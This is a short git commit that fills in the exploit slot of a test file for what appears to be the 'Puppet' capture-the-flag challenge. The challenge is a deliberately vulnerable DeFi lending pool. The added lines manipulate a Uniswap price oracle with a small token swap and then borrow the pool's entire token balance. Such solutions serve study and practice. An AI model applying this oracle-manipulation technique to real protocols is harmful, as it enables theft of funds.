e7cb3bea00b516e8e05ea7bff61ee74dd846494e
Stanly Johnson <stanlyjohnson@outlook.com>
2020-10-04 18:02:21 +0530

    puppet

--- test/puppet/puppet.challenge.js
+++ test/puppet/puppet.challenge.js
@@ -92,7 +92,12 @@ describe('[Challenge] Puppet', function () {
     });
 
     it('Exploit', async function () {
-        /** YOUR EXPLOIT GOES HERE */
+        
+        const deadline = (await web3.eth.getBlock('latest')).timestamp * 2;
+        await this.token.approve(this.uniswapExchange.address, ether('100'), { from: attacker });
+        await this.uniswapExchange.tokenToEthSwapInput(ether('0.01'), 1, deadline, { from: attacker });
+        await this.lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE, { from: attacker })
+        
     });
 
     after(async function () {
